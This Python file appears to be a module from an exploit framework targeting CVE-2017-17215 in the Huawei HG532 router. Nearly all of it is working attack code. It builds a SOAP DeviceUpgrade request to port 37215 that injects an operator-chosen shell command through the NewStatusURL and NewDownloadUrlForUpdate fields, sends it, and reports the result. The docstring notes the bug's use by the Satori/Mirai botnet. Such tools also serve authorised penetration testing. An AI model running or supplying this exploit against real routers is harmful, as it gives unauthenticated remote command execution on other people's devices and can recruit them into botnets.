# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Huawei HG532 UPnP SOAP Command Injection RCE (CVE-2017-17215).

    The Huawei HG532 home gateway router exposes a UPnP SOAP service on
    TCP/37215 that processes DeviceUpgrade actions.  The NewStatusURL and
    NewDownloadUrlForUpdate parameters are passed unsanitized to a system
    shell command, allowing unauthenticated remote command injection.

    This vulnerability was mass-exploited by the Satori/Okiru variant of
    the Mirai botnet in December 2017.

    CVSS v3.1: 8.8 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Huawei HG532 UPnP SOAP Command Injection (CVE-2017-17215)",
        "description": (
            "Exploits CVE-2017-17215 via unsanitized UPnP SOAP parameters in "
            "the Huawei HG532 DeviceUpgrade action handler on TCP/37215. "
            "The NewStatusURL parameter is injected into a shell command, "
            "allowing unauthenticated RCE. Originally weaponized by the "
            "Satori botnet variant."
        ),
        "authors": (
            "Check Point Research (discovery, 2017)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2017-17215",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17215",
            "https://research.checkpoint.com/2017/good-zero-day-skiddie/",
            "https://www.huawei.com/en/psirt/security-notices/huawei-sn-20171130-01-hg532-en",
        ),
        "devices": (
            "Huawei HG532",
            "Huawei HG532d",
            "Huawei HG532e",
        ),
    }

    target = OptIP("", "Target IPv4 address of the Huawei HG532")
    port = OptPort(37215, "UPnP SOAP service port (default 37215)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    command = OptString("id", "Command to inject (default: id)")

    _SOAP_TEMPLATE = (
        '<?xml version="1.0" ?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        "<s:Body>"
        '<u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">'
        "<NewStatusURL>$({cmd})</NewStatusURL>"
        "<NewDownloadUrlForUpdate>$({cmd})</NewDownloadUrlForUpdate>"
        "</u:Upgrade>"
        "</s:Body>"
        "</s:Envelope>"
    )

    def _build_soap_request(self, cmd: str) -> bytes:
        """Build the HTTP POST with the SOAP DeviceUpgrade action."""
        body = self._SOAP_TEMPLATE.format(cmd=cmd)
        headers = (
            f"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
            f"Host: {self.target}:{self.port}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Content-Type: text/xml\r\n"
            f'SOAPAction: "urn:schemas-upnp-org:service:WANPPPConnection:1#'
            f'NewStatusURL"\r\n'
            f"Connection: close\r\n"
            f"\r\n"
            f"{body}"
        )
        return headers.encode()

    def _send_tcp(self, data: bytes) -> bytes:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.target, self.port))
            sock.sendall(data)
            time.sleep(0.5)
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except (TimeoutError, OSError):
                pass
            return response
        except Exception:
            return b""
        finally:
            sock.close()

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target does not appear to have UPnP service on TCP/{self.port}"
            )
            return

        print_success("HG532 UPnP service confirmed; injecting command via SOAP")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe TCP/37215 for the UPnP SOAP service."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.close()
            return True
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(
            f"Injecting command '{self.command}' via DeviceUpgrade SOAP action "
            f"to {self.target}:{self.port}"
        )
        request = self._build_soap_request(self.command)
        response = self._send_tcp(request)

        if response:
            resp_str = response.decode("utf-8", errors="replace")
            print_info(f"Response ({len(response)} bytes):")
            for line in resp_str.split("\n")[:15]:
                stripped = line.strip()
                if stripped:
                    print_info(f"  {stripped}")

            if "200 OK" in resp_str or "UPnP" in resp_str:
                print_success(
                    "SOAP action accepted. Command injection delivered via "
                    "NewStatusURL parameter."
                )
            else:
                print_info("Unexpected response; target may be patched.")
        else:
            print_info(
                "No response received. The command may have executed but "
                "produced no output, or the service may be unavailable."
            )
